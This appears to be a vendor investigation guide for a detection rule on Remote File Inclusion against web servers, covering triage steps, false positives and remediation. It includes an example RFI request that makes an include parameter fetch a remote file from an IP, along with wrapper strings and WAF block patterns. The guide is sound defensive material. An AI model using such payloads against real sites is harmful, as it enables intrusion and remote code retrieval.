---
applies_to:
  stack: ga all
  serverless:
    security: ga all
products:
  - id: security
  - id: cloud-serverless
description: Investigation guide for the "Web Server Potential Remote File Inclusion Activity" prebuilt detection rule.
---

# Web Server Potential Remote File Inclusion Activity

## Triage and analysis

> **Disclaimer**:
> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.

### Investigating Web Server Potential Remote File Inclusion Activity

This rule identifies successful GET requests that pass a remote URL or raw IP in a parameter, signaling Remote File Inclusion attempts that coerce the app to fetch external content or reveal local files. RFI matters because it enables discovery, leaks sensitive data, and can bootstrap code retrieval for persistence or command-and-control. Example behavior: probing an include endpoint with /index.php?page=http://203.0.113.10/drop.txt to verify remote fetch and execution via a vulnerable loader.

### Possible investigation steps

- Decode the full request URL and parameters, identify the endpoint and parameter names, and confirm with application owners whether passing remote URLs is expected behavior for that route.
- Correlate the event time with outbound connections from the web server to the referenced domain or IP using egress firewall, proxy, DNS, or NetFlow logs to verify whether a fetch occurred.
- Review adjacent web access entries from the same source IP and user agent to detect scanning behavior, varied include parameters, wrapper strings (php://, data://, file://), or local file probes that indicate exploitation attempts.
- Check the referenced remote domain or IP with threat intelligence, and if needed, safely retrieve it in an isolated environment to examine content, redirects, and headers for droppers or callbacks.
- Look for post-inclusion artifacts by checking webroot and temp directories for newly created or modified files, suspicious script writes, and unusual access patterns, and inspect server or application configuration for risky URL include settings.

### False positive analysis

- Applications that legitimately accept full URLs in query parameters for link previews, content proxies, image fetching, or feed importers (e.g., url= or src=) will return 200 and match *=http(s)://*, appearing as RFI despite expected behavior.
- Administrative or diagnostic endpoints that allow users to supply IP addresses or URI schemes (ftp://, smb://, file://) to test connectivity or preview resources (e.g., target=192.168.1.10) can return 200 and trigger this rule even though no inclusion vulnerability is present.

### Response and remediation

- Immediately block offending source IPs and request patterns at the WAF/reverse proxy (e.g., GETs where page=, url=, or src= contains http://, https://, ftp://, smb://, or file://) and temporarily disable the affected include/loader endpoints until fixed.
- Restrict outbound connections from the web server to the domains and IPs referenced in the requests and quarantine the host if 200 OK responses align with remote downloads or wrapper usage such as php://, data://, file://.
- Collect forensic images, then remove newly created or modified scripts in webroot and temp directories (e.g., /var/www, uploads, /tmp), delete unauthorized .htaccess/web.config entries, clear caches, and terminate suspicious processes running under the web server account.
- Redeploy the application from a known-good build, restore clean configuration files, rotate credentials exposed by local file probes (e.g., config.php, .env), invalidate sessions, and verify functionality before returning the service to production.
- Harden by disabling risky features and enforcing strict input controls: set PHP allow_url_include=Off and allow_url_fopen=Off, apply open_basedir restrictions, implement scheme/domain allowlists for any include/load functionality, and sanitize and normalize user-supplied parameters.
- Escalate to incident response and preserve disk and memory images if remote content was fetched and executed, a webshell or unknown script is found in the webroot, or the same actor generates successful 200 RFI-style requests across multiple hosts.
- Enhance monitoring for RFI attempts by tuning WAF rules to alert on suspicious include parameters, enabling detailed web server logging, and setting up alerts for anomalous outbound connections from web servers.

